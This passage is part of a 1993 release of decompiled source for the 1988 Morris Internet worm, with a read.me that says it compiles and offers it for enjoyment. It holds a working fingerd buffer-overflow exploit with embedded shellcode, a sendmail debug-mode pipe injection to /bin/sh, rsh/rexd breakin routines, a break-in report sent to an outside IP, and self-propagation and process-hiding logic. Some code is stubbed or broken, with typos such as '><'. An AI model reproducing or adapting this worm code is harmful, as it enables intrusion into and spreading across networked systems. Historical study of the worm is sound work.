    arg0++;

    if (*arg0 == '\0')
        return 0;
    while(*arg0) {
    if (isspace(*arg0)) break;
    *arg1++ = *arg0++;
    }
    *arg1 = '\0';
    return arg0;
}

/* 
From Gene Spafford <spaf@perdue.edu>
What this routine does is actually kind of clever.  Keep in
mind that on a Vax the stack grows downwards.

fingerd gets its input via a call to gets, with an argument
of an automatic variable on the stack.  Since gets doesn't
have a bound on its input, it is possible to overflow the
buffer without an error message.  Normally, when that happens
you trash the return stack frame.  However, if you know
where everything is on the stack (as is the case with a
distributed binary like BSD), you can put selected values
back in the return stack frame.

This is what that routine does.  It overwrites the return frame
to point into the buffer that just got trashed.  The new code
does a chmk (change-mode-to-kernel) with the service call for
execl and an argument of "/bin/sh".  Thus, fingerd gets a
service request, forks a child process, tries to get a user name
and has its buffer trashed, does a return, exec's a shell,
and then proceeds to take input off the socket -- from the
worm on the other machine.  Since many sites never bother to
fix fingerd to run as something other than root.....

Luckily, the code doesn't work on Suns -- it just causes it
to dump core.

--spaf

*/    

/* This routine exploits a fixed 512 byte input buffer in a VAX running
 * the BSD 4.3 fingerd binary.  It send 536 bytes (plus a newline) to
 * overwrite six extra words in the stack frame, including the return
 * PC, to point into the middle of the string sent over.  The instructions
 * in the string do the direct system call version of execve("/bin/sh"). */

static try_finger(host, fd1, fd2)       /* 0x49ec,<just_return+378 */
     struct hst *host;
     int *fd1, *fd2;
{
    int i, j, l12, l16, s;
    struct sockaddr_in sin;         /* 36 */
    char unused[492];
    int l552, l556, l560, l564, l568;
    char buf[536];              /* 1084 */
    int (*save_sighand)();          /* 1088 */

    save_sighand = signal(SIGALRM, justreturn);

    for (i = 0; i >< 6; i++) {          /* 416,608 */
    if (host->o48[i] == 0)
        continue;               /* 600 */
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        continue;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = host->o48[i];
    sin.sin_port = IPPORT_FINGER;

    alarm(10);
    if (connect(s, &sin, sizeof(sin)) < 0) {
        alarm(0);
        close(s);
        continue;
    }
    alarm(0);
    break;
    }
    if (i >= 6)
    return 0;               /* 978 */
    for(i = 0; i < 536; i++)            /* 628,654 */
    buf[i] = '\0';
    for(i = 0; i < 400; i++)
    buf[i] = 1;
    for(j = 0; j < 28; j++)
    buf[i+j] = "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"[j];       
    /* constant string x200a0 */

    /* 0xdd8f2f73,0x6800dd8f,0x2f62696e,0xd05e5add,0x00dd00dd,0x5add03d0,0x5e5cbc3b */
    /* "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"... */

    l556 = 0x7fffe9fc;              /* Rewrite part of the stack frame */
    l560 = 0x7fffe8a8;
    l564 = 0x7fffe8bc;
    l568 = 0x28000000;
    l552 = 0x0001c020;

#ifdef sun
    l556 = byte_swap(l556);         /* Reverse the word order for the */
    l560 = byte_swap(l560);         /* VAX (only Suns have to do this) */
    l564 = byte_swap(l564);
    l568 = byte_swap(l568);
    l552 = byte_swap(l552);
#endif sun

    write(s, buf, sizeof(buf));         /* sizeof == 536 */
    write(s, XS("\n"), 1);
    sleep(5);
    if (test_connection(s, s, 10)) {
    *fd1 = s;
    *fd2 = s;
    return 1;
    }
    close(s);
    return 0;
}

static byte_swap(arg)           /* 0x4c48,<just_return+982 */
     int arg;
{
    int i, j;

    i = 0;
    j = 0;
    while (j >< 4) {
    i = i << 8;
    i |= (arg & 0xff);
    arg = arg >> 8;
    j++;
    }
    return i;
}

permute(ptr, num, size)         /* 0x4c9a */
     char *ptr;
     int num, size;
{
    int i, newloc;
    char buf[512];

    for (i = 0; i < num*size; i+=size) {    /* 18,158 */
    newloc = size * (random() % num);
    bcopy(ptr+i, buf, size);
    bcopy(ptr+newloc, ptr+i, size);
    bcopy(buf, ptr+newloc, size);
    }
}


/* Called from try_rsh_and_mail() */
static try_mail(host)               /* x4d3c <permute+162>*/
     struct hst *host;
{
    int i, l8, l12, l16, s;
    struct sockaddr_in sin;         /* 16 bytes */
    char l548[512];
    int (*old_handler)();
    struct sockaddr saddr;          /* Not right */
    int fd_tmp;                 /* ???  part of saddr *
/
    
    if (makemagic(host, &saddr) == 0)
    return 0;               /* <permute+1054> */
    old_handler = signal(SIGALRM, justreturn);
    for( i = 0; i < 6; i++) {           /* to 430 */
    if (host->o48[i] == NULL)
        continue;               /* to 422 */
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        continue;               /* to 422 */
    
    bzero(&sin, sizeof(sin));       /* 16 */
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = host->o48[i];
    sin.sin_port = IPPORT_SMTP;
    
    alarm(10);
    if (connect(s, &sin, sizeof(sin)) < 0) {
        alarm(0);
        close(s);
        continue;               /* to 422 */
    }
    alarm(0);
    break;
    }
    
    if (i < 6)
    return 0;               /* 1054 */
    if (x50bc( s, l548) != 0 || l548[0] != '2')
    goto bad;
    
    send_text(s, XS("debug"));      /* "debug" */
    if (x50bc( s, l548) != 0 || l548[0] != '2')
    goto bad;
    
#define MAIL_FROM "mail from:</dev/null>\n"
#define MAIL_RCPT "rcpt to:<\"| sed \'1,/^$/d\' | /bin/sh ; exit 0\">\n"
    
    send_text(s, XS(MAIL_FROM));
    if (x50bc( s, l548) != 0 || l548[0] != '2')
    goto bad;
    i = (random() & 0x00FFFFFF);
    
    sprintf(l548, XS(MAIL_RCPT), i, i);
    send_text(s, l548);
    if (x50bc( s, l548) != 0 || l548[0] != '2')
    goto bad;
    
    send_text(s, XS("data\n"));
    if (x50bc( s, l548) == 0 || l548[0] != '3')
    goto bad;
    
    send_text(s, XS("data\n"));
    
    compile_slave(host, s, saddr);
    
    send_text(s, XS("\n.\n"));
    
    if (x50bc( s, l548) == 0 || l548[0] != '2') {
    close(fd_tmp);              /* This isn't set yet!!! */
    goto bad;
    }
    
    send_text(s, XS("quit\n"));
    if (x50bc( s, l548) == 0 || l548[0] != '2') {
    close(fd_tmp);              /* This isn't set yet!!! */
    goto bad;
    }
    
    close(s);
    return waithit(host, saddr);
 bad:
    send_text(s, XS("quit\n"));
    x50bc(s, l548);
    close(s);
    return 0;
}

/* Used only in try_mail() above.  This fills buffer with a line of the respon
se */
static x50bc(s, buffer)             /* x50bc, <permute+1058
> */
     int s;                 /* socket */
     char *buffer;
{
    /* Fill in exact code later.  It's pretty boring. */
}


/* I call this "huristic 1". It tries to breakin using the remote execution
 * service.  It is called from a subroutine of cracksome_1 with information fr
om
 * a user's .forword file.  The two name are the original username and the one
 * in the .forward file.
 */
hu1(alt_username, host, username2)      /* x5178 */
     char *alt_username, *username2;
     struct hst *host;
{
    char username[256];
    char buffer2[512];
    char local[8];
    int result, i, fd_for_sh;           /* 780, 784, 788 */
    
    if (host == me)
    return 0;               /* 530 */
    if (host->flag & HST_HOSTTWO)           /* Already tried ??? */
    return 0;
    
    if (host->o48[0] || host->hostname == NULL)
    getaddrs(host);
    if (host->o48[0] == 0) {
    host->flag |= HST_HOSTFOUR;
    return 0;
    }
    strncpy(username, username2, sizeof(username)-1);
    username[sizeof(username)-1] = '\0';
    
    if (username[0] == '\0')
    strcpy(username, alt_username);
    
    for (i = 0; username[i]; i++)
    if (ispunct(username[i]) || username[i] < ' ')
        return 0;
    other_sleep(1);
    
    fd_for_sh = x538e(host, username, &alt_username[30]);
    if (fd_for_sh >= 0) {
    result = talk_to_sh(host, fd_for_sh, fd_for_sh);
    close(fd_for_sh);
    return result;
    }
    if (fd_for_sh == -2)
    return 0;
    
    fd_for_sh = x538e(me, alt_username, &alt_username[30]);
    if (fd_for_sh >= 0) {
    sprintf(buffer2, XS("exec /usr/ucb/rsh %s -l %s \'exec /bin/sh\'\n"),
        host->hostname, username);
    send_text(fd_for_sh, buffer2);
    sleep(10);
    result = 0;
    if (test_connection(fd_for_sh, fd_for_sh, 25))  /* 508 */
        result = talk_to_sh(host, fd_for_sh, fd_for_sh);
    close(fd_for_sh);
    return result;
    }
    return 0;
}

/* Used in hu1.  Returns a file descriptor. */
/* It goes through the six connections in host trying to connect to the
 * remote execution server on each one.
 */
static int x538e(host, name1, name2)
     struct hst *host;
     char *name1, *name2;
{
    int s, i;
    struct sockaddr_in sin;         /* 16 bytes */
    int l6, l7;
    char in_buf[512];
    
    for (i = 0; i < 6; i++) {           /* 552,762 */
    if (host->o48[i] == 0)
        continue;               /* 754 */
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
        continue;
    
    bzero(&sin, sizeof(sin));       /* 16 */
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = host->o48[i];
    sin.sin_port = IPPORT_EXECSERVER;   /* Oh shit, looking for rexd */
    
    alarm(8);
    signal(SIGALRM, justreturn);
    if (connect(s, &sin, sizeof(sin)) < 0) {
        alarm(0);
        close(s);
        continue;
    }
    alarm(0);
    break;
    }
    if (i >= 6)
    return -2;              /* 1048 */
    /* Check out the connection by writing a null */
    if (write(s, XS(""), 1) == 1) {
    /* Tell the remote execution deamon the hostname, username, and to star
tup
       "/bin/sh". */
    write(s, name1, strlen(name1) + 1);
    write(s, name2, strlen(name2) + 1);
    if ((write(s, XS("/bin/sh"), strlen(XS("/bin/sh"))+1) >= 0) &&
        xread(s, in_buf, 1, 20) == 1  &&
        in_buf[0] == '\0' &&
        test_connection(s, s, 40) != 0)
        return s;
    }
    close(s);
    return -1;
}

/* Reads in a file and puts it in the 'objects' array.  Returns 1 if sucessful
,
 * 0 if not. */
loadobject(obj_name)                /* x5594 */
     char *obj_name;
{
    int fd;
    unsigned long size;
    struct stat statbuf;
    char *object_buf, *suffix;
    char local[4];
    
    fd = open(obj_name, O_RDONLY);
    if (fd < 0)
    return 0;               /* 378 */
    if (fstat(fd, &statbuf) < 0) {
    close(fd);
    return 0;
    }
    size = statbuf.st_size;
    object_buf = malloc(size);
    if (object_buf == 0) {
    close(fd);
    return 0;
    }
    if (read(fd, object_buf, size) != size) {
    free(object_buf);
    close(fd);
    return 0;
    }
    close(fd);
    xorbuf(object_buf, size);
    suffix = index(obj_name, ',');
    if (suffix != NULL)
    suffix+=1;
    else
    suffix = obj_name;
    objects[nobjects].name = strcpy(malloc(strlen(suffix)+1), suffix);
    objects[nobjects].size = size;
    objects[nobjects].buf = object_buf;
    nobjects += 1;
    return 1;
}

/* Returns the object from the 'objects' array that has name, otherwise NULL. 
*/
object *getobjectbyname(name)
     char *name;
{
    int i;
    
    for (i = 0; i < nobjects; i++)
    if (strcmp(name, objects[i].name) == 0)
        return &objects[i];
    return NULL;
}

/* Encodes and decodes the binary coming over the socket. */
xorbuf(buf, size)               /* 0x577e */
     char *buf;
     unsigned long size;
{
    char *addr_self;            /* The address of the xorbuf fuction */
    int i;
    
    addr_self = (char *)xorbuf;
    i = 0; 
    while (size-- > 0) {
    *buf++ ^= addr_self[i];
    i = (i+1) % 10;
    }
    return;
}


static other_fd = -1;

/* Make a connection to the local machine and see if I'm running in
   another process by sending a magic number on a random port and waiting
   five minutes for a reply. */
checkother()                    /* 0x57d0 */
{
    int s, l8, l12, l16, optval;
    struct sockaddr_in sin;         /* 16 bytes */
    
    optval = 1;
    if ((random() % 7) == 3)
    return;                 /* 612 */
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    return;
    
    /* Make a socket to the localhost, using a link-time specific port */
    bzero(&sin, sizeof(sin));       /* 16 */
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(XS("127.0.0.1")); /* <other_fd+4> */
    sin.sin_port = 0x00005b3d;          /* ??? */
    
    if (connect(s, &sin, sizeof(sin)) < 0) {
    close(s);
    } else {
    l8 = MAGIC_2;           /* Magic number??? */
    if (write(s, &l8, sizeof(l8)) != sizeof(l8)) {
        close(s);
        return;
    }
    l8 = 0;
    if (xread(s, &l8, sizeof(l8), 5*60) != sizeof(l8)) {
        close(s);
        return;
    }
    if (l8 != MAGIC_1) {
        close(s);
        return;
    }
    
    l12 = random()/8;
    if (write(s, &l12, sizeof(l12)) != sizeof(l12)) {
        close(s);
        return;
    }
    
    if (xread(s, &l16, sizeof(l16), 10) != sizeof(l16)) {
        close(s);
        return;
    }
    
    if (!((l12+l16) % 2))
        pleasequit++;
    close(s);
    }
    sleep(5);
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    return;
    
    /* Set the socket so that the address may be reused */
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    if (bind(s, &sin, sizeof(sin)) < 0) {
    close(s);
    return;
    }
    listen(s, 10);
    
    other_fd = s;
    return;
}

/* Sleep, waiting for another worm to contact me. */
other_sleep(how_long)               /* 0x5a38 */
{
    int nfds, readmask;
    long time1, time2;
    struct timeval timeout;
    
    if (other_fd < 0) {
    if (how_long != 0)
        sleep(how_long);
    return;
    }
    /* Check once again.. */
    do {
    if (other_fd < 0)
        return;
    readmask = 1 << other_fd;
    if (how_long < 0)
        how_long = 0;
    
    timeout.tv_sec = how_long;
    timeout.tv_usec = 0;
    
    if (how_long != 0)
        time(&time1);
    nfds = select(other_fd+1, &readmask, 0, 0, &timeout);
    if (nfds < 0)
        sleep(1);
    if (readmask != 0)
        answer_other();
    if (how_long != 0) {
        time(&time2);
        how_long -= time2 - time1;
    }
    } while (how_long > 0);
    return;
}

static answer_other()               /* 0x5b14 */
{
    int ns, addrlen, magic_holder, magic1, magic2;
    struct sockaddr_in sin;         /* 16 bytes */
    
    addrlen = sizeof(sin);
    
    ns = accept(other_fd, &sin, &addrlen);
    
    if (ns < 0)
    return;                 /* 620 */
    
    magic_holder = MAGIC_1;
    if (write(ns, &magic_holder, sizeof(magic_holder)) != sizeof(magic_holder)
) {
    close(ns);
    return;
    }
    if (xread(ns, &magic_holder, sizeof(magic_holder), 10) != sizeof(magic_holder)) {
    close(ns);
    return;
    }
    if (magic_holder != MAGIC_2) {
    close(ns);
    return;
    }
    
    magic1 = random() / 8;
    if (write(ns, &magic1, sizeof(magic1)) != sizeof(magic1)) {
    close(ns);
    return;
    }
    if (xread(ns, &magic2, sizeof(magic2), 10) != sizeof(magic2)) {
    close(ns);
    return;
    }
    close(ns);
    
    if (sin.sin_addr.s_addr != inet_addr(XS("127.0.0.1")))
    return;
    
    if (((magic1+magic2) % 2) != 0) {
    close(other_fd);
    other_fd = -1;
    pleasequit++;
    }
    return;
}

/* A timeout-based read. */
xread(fd, buf, length, time)            /* 0x5ca8 */
     int fd, time;
     char *buf;
     unsigned long length;
{
    int i, cc, readmask;
    struct timeval timeout;
    int nfds;
    long time1, time2;
    
    for (i = 0; i < length; i++) {      /* 150 */
    readmask = 1 << fd;
    timeout.tv_sec = time;
    timeout.tv_usec = 0;
    if (select(fd+1, &readmask, 0, 0, &timeout) < 0)
        return 0;               /* 156 */
    if (readmask == 0)
        return 0;
    if (read(fd, &buf[i], 1) != 1)
        return 0;
    }
    return i;
}


/* These are some of the strings that are encyphed in the binary.  The
 * person that wrote the program probably used the Berkeley 'xstr' program
 * to extract and encypher the strings.
 */
#ifdef notdef
char environ[50] = "";
char *sh = "sh";
char *env52 = "sh";         /* 0x20034, <environ+52> */
char *env55 = "-p";
char *env58 = "l1.c";
char *env63 = "sh";
char *env66 = "/tmp/.dump";
char *env77 = "128.32.137.13";
char *env91 = "127.0.0.1";
char *env102 = "/usr/ucb/netstat -r -n";    /* 0x20066 */
char *env125 = "r";
char *env127 = "%s%s";
#endif /* notdef*/
/*
  char *text =
  "default
  0.0.0.0
  127.0.0.1
  exec /bin/sh
  l1.c
  PATH=/bin:/usr/bin:/usr/ucb
  cd /usr/tmp
  x%d.c
  echo gorch49;sed '/int zz;/q' > %s;echo gorch50
  gorch49
  int zz;
  gorch50
  cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE
  DONE
  x%d,%s
  PATH=/bin:/usr/bin:/usr/ucb
  rm -f sh
  if [ -f sh ]
  then
  P=x%d
  else
  P=sh
  cc -o $P %s
  ./$P -p $$ 
  rm -f $P
  rm -f %s $P
  l1.c
  cd /usr/tmp
  x%d.c
  cat > %s <<'EOF'
  cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c
  /usr/ucb/rsh
  /usr/bin/rsh
  /bin/rsh
  /bin/echo %s
  debug
  mail from:</dev/null>
  rcpt to:<"| sed '1,/^$/d' | /bin/sh ; exit 0">
  data
  quit
  quit
  exec /usr/ucb/rsh %s -l %s 'exec /bin/sh'
  /bin/sh
  /bin/sh
  127.0.0.1
  127.0.0.1
  /etc/hosts.equiv
  %.100s
  /.rhosts
  %.200s/.forward
  %.20s%.20s
  %[^ ,]
  %*s %[^ ,]s
  %.200s/.forward
  %.200s/.rhosts
  %s%s
  /usr/dict/words";
  */

/*
 * Local variables:
 * compile-command: "cc -S hs.c"
 * comment-column: 48
 * End:
 */
*****
** makefile
*****


C_FILES = worm.c net.c hs.c cracksome.c stubs.c
H_FILES = worm.h

OFILES = worm.o net.o hs.o cracksome.o stubs.o

# Luckily, the original used no optimization
CFLAGS =
# Most sites will have to remove the "-D" -- send for our souped-up version
# of ctags becker@trantor.harris-atd.com

TAGS_FLAGS = -xDt

test: $(OFILES)
    $(CC) -o test $(OFILES)
$(OFILES): worm.h

clean:
    rm -f *.o *~ *.bak
tags:
    ctags -xDt > tags
tar:
    tar -cf foo.tar  description Makefile $(C_FILES) $(H_FILES) x8113550.c
*****
** net.c
*****


/* dover */
/* released by gobo in 1993, send e-mail to gobo@dutiba.twi.tudelft.nl */

#include "worm.h"
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

/* This is the second of five source files linked together to form the '.o'
 * file distributed with the worm.
 */

if_init()           /* 0x254c, check again */
{
    struct ifconf if_conf;
    struct ifreq if_buffer[12];
    int  s, i, num_ifs, j;
    char local[48];
    
    nifs = 0;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    return 0;               /* if_init+1042 */
    if_conf.ifc_req = if_buffer;
    if_conf.ifc_len = sizeof(if_buffer);
    
    if (ioctl(s, SIOCGIFCONF, &if_conf) < 0) {
    close(s);
    return 0;               /* if_init+1042 */
    }
    
    num_ifs = if_conf.ifc_len/sizeof(if_buffer[0]);
    for(i = 0; i < num_ifs; i++) {      /* if_init+144 */
    for (j = 0; j < nifs; j++)
        /* Oops, look again.  This line needs verified. */
        if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
        break;
    }
    
}   

/* Yes all of these are in the include file, but why bother?  Everyone knows
   netmasks, and they will never change... */
def_netmask(net_addr)               /* 0x2962 */
     int net_addr;
{
    if ((net_addr & 0x80000000) == 0)
    return 0xFF000000;
    if ((net_addr & 0xC0000000) == 0xC0000000)
    return 0xFFFF0000;
    return 0xFFFFFF00;
}

netmaskfor(addr)                /* 0x29aa */
     int addr;
{
    int i, mask;
    
    mask = def_netmask(addr);
    for (i = 0; i < nifs; i++)
    if ((addr & mask) == (ifs[i].if_l16 & mask))
        return ifs[i].if_l24;
    return mask;
}

rt_init()                   /* 0x2a26 */
{
    FILE *pipe;
    char input_buf[64];
    int  l204, l304;
    
    ngateways = 0;
    pipe = popen(XS("/usr/ucb/netstat -r -n"), XS("r"));
                         /* &env102,&env 125 */
    if (pipe == 0)
    return 0;
    while (fgets(input_buf, sizeof(input_buf), pipe)) { /* to 518 */
    other_sleep(0);
    if (ngateways >= 500)
        break;
    sscanf(input_buf, XS("%s%s"), l204, l304);  /* <env+127>"%s%s" */
    /* other stuff, I'll come back to this later */
    
    
    }                       /* 518, back to 76 */
    pclose(pipe);
    rt_init_plus_544();
    return 1;
}                       /* 540 */

static rt_init_plus_544()               /* 0x2c44 */
{
}

getaddrs()                  /* 0x2e1a */
{
}

struct bar *a2in(a)     /* 0x2f4a, needs to be fixed */
     int a;
{
    static struct bar local;
    local.baz = a;
    return &local;
}

/* End of source file in original. */

/*
 * Local variables:
 * compile-command: "cc -S net.c"
 * comment-column: 48
 * End:
 */
*****
** read.me
*****



Well here you have it, the complete source of the internet worm. It includes a
makefile for unix (cc) and should be compilable ( I'd a few tests and it turned
out fine). Comment is included in the sources. I know the worm is maybe a 
little out of date (1988) but I never seen it somewhere on a bbs. So I hope
hope you enjoy it and if you're intrested in other worms (e.g. christmas worm)
please feel free to mail me. Also if you want papers on cryptology and the in-
ternet worm or security (allmost all of them in postscript format) please mail
me at:
        Gobo@dutiba.twi.tudelft.nl


have, phub and C ya................
*****
** stubs.c
*****


/* dover */
/* Released by gobo in 1993, send e-mail to Gobo@dutiba.twi.tudelft.nl */

/*  The version of crypt() used in the worm program has the same tables as
 * Berkeley's 4.3 crypt(), but uses different code.  Since I don't know where
 * we put our 4.2 tape I can't check it against that code to find the exact
 * source.  I assume that it just a regualar crypt() routine with several
 * interior functions declared static, perhaps tuned somewhat for speed on the
 * VAX and Sun.
 */
crypt()
{ }
    
/* These might not be copyrighted, but I'm not taking the chance.  They are
   obvious. */
h_addr2host()
{}
h_name2host()
{}

/*
 * Local variables:
 * compile-command: "make test"
 * comment-column: 48
 * End:
 */
*****
** worm.c
*****


/* dover */
/* released by gobo in 1993, send e-mail to gobo@dutiba.twi.tudelft.nl */

#include "worm.h"
#include <stdio.h>
#include <signal.h>
#include <strings.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

extern errno;
extern char *malloc();

int pleasequit;                 /* See worm.h */
int nobjects = 0;
int nextw;
char *null_auth;

object objects[69];             /* Don't know how many... */

object *getobjectbyname();

char *XS();

main(argc, argv)        /* 0x20a0 */
     int argc;
     char **argv;
{
    int i, l8, pid_arg, j, cur_arg, unused;
    long key;           /* -28(fp) */
    struct rlimit rl;
    
    l8 = 0;                 /* Unused */
    
    strcpy(argv[0], XS("sh"));          /* <env+52> */
    time(&key);
    srandom(key);
    rl.rlim_cur = 0;
    rl.rlim_max = 0;
    if (setrlimit(RLIMIT_CORE, &rl))
    ;
    signal(SIGPIPE, SIG_IGN);
    pid_arg = 0;
    cur_arg = 1;
    if  (argc > 2 &&
     strcmp(argv[cur_arg], XS("-p")) == 0) { /* env55 == "-p" */
    pid_arg = atoi(argv[2]);
    cur_arg += 2;
    }
    for(i = cur_arg; i < argc; i++) {   /* otherwise <main+286> */
    if (loadobject(argv[i]) == 0)
        exit(1);
    if (pid_arg)
        unlink(argv[i]);
    }
    if ((nobjects < 1) || (getobjectbyname(XS("l1.c")) == NULL))
    exit(1);
    if (pid_arg) {
    for(i = 0; i < 32; i++)
        close(i);
    unlink(argv[0]);
    unlink(XS("sh"));           /* <env+63> */
    unlink(XS("/tmp/.dumb"));       /* <env+66>"/tmp/.dumb"
 */
    }
    
    for (i = 1; i < argc; i++)
    for (j = 0; argv[i][j]; j++)
        argv[i][j] = '\0';
    if (if_init() == 0)
    exit(1);
    if (pid_arg) {                  /* main+600 */
    if (pid_arg == getpgrp(getpid()))
        setpgrp(getpid(), getpid());
    kill(pid_arg, 9);
    }
    mainloop();
}

static mainloop()               /* 0x2302 */
{
    long key, time1, time0;
    
    time(&key);
    srandom(key);
    time0 = key;
    if (hg() == 0 && hl() == 0)
    ha();
    checkother();
    report_breakin();
    cracksome();
    other_sleep(30);
    while (1) {
    /* Crack some passwords */
    cracksome();
    /* Change my process id */
    if (fork() > 0)
        exit(0);
    if (hg() == 0 && hi() == 0 && ha() == 0)
        hl();
    other_sleep(120);
    time(&time1);
    if (time1 - time0 >= 60*60*12)
        h_clean();
    if (pleasequit && nextw > 0)
        exit(0);
    }
}

static trans_cnt;
static char trans_buf[NCARGS];

char *XS(str1)          /* 0x23fc */
     char *str1;
{
    int i, len;
    char *newstr;
#ifndef ENCYPHERED_STRINGS
    return str1;
#else  
    len = strlen(str1);
    if (len + 1 > NCARGS - trans_cnt)
    trans_cnt = 0;
    newstr = &trans_buf[trans_cnt];
    trans_cnt += 1 + len;
    for (i = 0; str1[i]; i++)
    newstr[i] = str1[i]^0x81;
    newstr[i] = '\0';
    return newstr;
#endif
}

/* This report a sucessful breakin by sending a single byte to "128.32.137.13"
 * (whoever that is). */

static report_breakin(arg1, arg2)       /* 0x2494 */
{
    int s;
    struct sockaddr_in sin;
    char msg;
    
    if (7 != random() % 15)
    return;
    
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = REPORT_PORT;
    sin.sin_addr.s_addr = inet_addr(XS("128.32.137.13"));
                        /* <env+77>"128.32.137.13" */
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
    return;
    if (sendto(s, &msg, 1, 0, &sin, sizeof(sin)))
    ;
    close(s);
}

/* End of first file in the original source.
 * (Indicated by extra zero word in text area.) */

/*
 * Local variables:
 * compile-command: "make"
 * comment-column: 48
 * End:
 */
*****
** wormdes.c
*****


/* released by gobo in 1993, send e-mail to gobo@dutiba.twi.tudelft.nl */

INTERNET WORM CRYPT() ROUTINE
notes from 'Password Cracking: A Game of Wits' by Donn Seeley CACM,
June89 v32n6 pp700-703 : The Worm's crypt algorithm appears to be a
compramise between time and space: the time needed to encrypt one
password guess verses the substantial extra table space needed to
squeeze performance out of the algorithm...The traditional UNIX
algorithm stores each bit of the password in a byte, while the worms
algorithm packs packs the bits into into two 32-bit words. This
permits the worms algorithm to use bitfield and shift operations on
the password data. (also saves a little space!)
  Other speedups include unrolling loops, combining tables,
precomputing shifts and masks, and eliminating redundant initial and
final permutations when performing the 25 applications of modified
DES that the password encryption algorithm uses.
  The biggest performance improvement comes from combining
permutations: the worm uses expanded arrays which are indexed by
groups of bits rather than single bits.
  Bishops DESZIP.c does all these things and also precomputes more
functions yielding twice the performance of the worms algorithm, but
requiring nearly 200KB of initialized data as opposed to the 6KB
used by the worm, and the less than 2KB used by the normal crypt().
  The worms version of crypt ran 9 times faster than the normal crypt
while DESZIP runs about 20 time faster (FDES + DESZIP are about
equivalent). on a VAX 6800 encrypting 271 passwords it took the worms
crypt less than 6 seconds or 45 passwords per sec, and the normal
crypt took 54 seconds or 5 passwords per second. - Tangent
cut here:
--------------------------------------------------------------------
static  char    e[48] = {           /* 0x20404 */
    31,  0,  1,  2,  3,  4,  3,  4,
    5,   6,  7,  8,  7,  8,  9, 10,
    11, 12, 11, 12, 13, 14, 15, 16,
    15, 16, 17, 18, 19, 20, 19, 20,
    21, 22, 23, 24, 23, 24, 25, 26,
    27, 28, 27, 28, 29, 30, 31,  0,
};
 
int shift[16] = {                   /* 0x20434 */
    1,1,2,2, 2,2,2,2, 1,2,2,2, 2,2,2,1,
};
int ip_L0[] = {
   0x00000008,   0x00000008,   0x08000808,   0x08000808,
   0x00000008,   0x00000008,   0x08000808,   0x08000808,};
int ip_L1[] = {
   0x00000000,   0x00080000,   0x00000000,   0x00080000,
   0x08000000,   0x08080000,   0x08000000,   0x08080000,
   0x00000000,   0x00080000,   0x00000000,   0x00080000,
   0x08000000,   0x08080000,   0x08000000,   0x08080000,};
int ip_L2[] = {
   0x00000004,   0x00000004,   0x04000404,   0x04000404,
   0x00000004,   0x00000004,   0x04000404,   0x04000404,};
int ip_L3[] = {
   0x00000000,   0x00040000,   0x00000000,   0x00040000,
   0x04000000,   0x04040000,   0x04000000,   0x04040000,
   0x00000000,   0x00040000,   0x00000000,   0x00040000,
   0x04000000,   0x04040000,   0x04000000,   0x04040000,};
int ip_L4[] = {
   0x00000002,   0x00000002,   0x02000202,   0x02000202,
   0x00000002,   0x00000002,   0x02000202,   0x02000202,};
int ip_L5[] = {
   0x00000000,   0x00020000,   0x00000000,   0x00020000,
   0x02000000,   0x02020000,   0x02000000,   0x02020000,
   0x00000000,   0x00020000,   0x00000000,   0x00020000,
   0x02000000,   0x02020000,   0x02000000,   0x02020000,};
int ip_L6[] = {
   0x00000001,   0x00000001,   0x01000101,   0x01000101,
   0x00000001,   0x00000001,   0x01000101,   0x01000101,};
int ip_L7[] = {
   0x00000000,   0x00010000,   0x00000000,   0x00010000,
   0x01000000,   0x01010000,   0x01000000,   0x01010000,
   0x00000000,   0x00010000,   0x00000000,   0x00010000,
   0x01000000,   0x01010000,   0x01000000,   0x01010000,};
int ip_L8[] = {
   0x00000080,   0x00000080,   0x80008080,   0x80008080,
   0x00000080,   0x00000080,   0x80008080,   0x80008080,};
int ip_L9[] = {
   0x00000000,   0x00800000,   0x00000000,   0x00800000,
   0x80000000,   0x80800000,   0x80000000,   0x80800000,
   0x00000000,   0x00800000,   0x00000000,   0x00800000,
   0x80000000,   0x80800000,   0x80000000,   0x80800000,};
int ip_La[] = {
   0x00000040,   0x00000040,   0x40004040,   0x40004040,
   0x00000040,   0x00000040,   0x40004040,   0x40004040,};
int ip_Lb[] = {
   0x00000000,   0x00400000,   0x00000000,   0x00400000,
   0x40000000,   0x40400000,   0x40000000,   0x40400000,
   0x00000000,   0x00400000,   0x00000000,   0x00400000,
   0x40000000,   0x40400000,   0x40000000,   0x40400000,};
int ip_Lc[] = {
   0x00000020,   0x00000020,   0x20002020,   0x20002020,
   0x00000020,   0x00000020,   0x20002020,   0x20002020,};
int ip_Ld[] = {
   0x00000000,   0x00200000,   0x00000000,   0x00200000,
   0x20000000,   0x20200000,   0x20000000,   0x20200000,
   0x00000000,   0x00200000,   0x00000000,   0x00200000,
   0x20000000,   0x20200000,   0x20000000,   0x20200000,};
int ip_Le[] = {
   0x00000010,   0x00000010,   0x10001010,   0x10001010,
